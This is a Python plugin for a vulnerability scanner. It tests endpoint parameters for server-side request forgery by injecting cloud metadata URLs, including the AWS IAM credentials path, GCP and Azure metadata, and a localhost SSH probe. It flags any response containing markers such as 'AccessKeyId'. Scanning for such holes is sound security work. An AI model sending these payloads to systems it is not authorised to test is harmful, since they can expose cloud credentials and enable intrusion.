from sdk.base_plugin import BasePlugin

class SSRFPlugin(BasePlugin):
    name = "SSRF (Enterprise)"

    # We use high-fidelity cloud metadata checks.
    # These are hard to fake.
    
    PAYLOADS = [
        # AWS
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId"),
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "google"),
        # Azure
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
        # Generic Localhost (Port Scanning indicator)
        ("http://127.0.0.1:22", "SSH-2.0")
    ]

    def should_run(self, endpoint):
        return len(endpoint.params) > 0

    def detect(self, http, endpoint, payload_intel):


        findings = []
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
        except: return

        for param in endpoint.params:
            param_name = param['name']

            for payload, marker in self.PAYLOADS:
                fuzzed = base_params.copy()
                fuzzed[param_name] = payload
                
                try:
                    resp = self._make_request(http, endpoint, fuzzed)
                    if not resp: continue
                    
                    if marker in resp.text:
                        # Proof found
                        findings.append({'plugin': self.name, 'endpoint': endpoint.url, 'parameter': param_name, 'payload': payload, 'evidence': f"SSRF / Metadata Leak: {marker}", 'confidence': "CRITICAL", 'details': "Cloud metadata or internal service banner found."})
                        return

                except: continue
        return findings

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request(endpoint.method, endpoint.url, data=params)
        return http.request(endpoint.method, endpoint.url, params=params)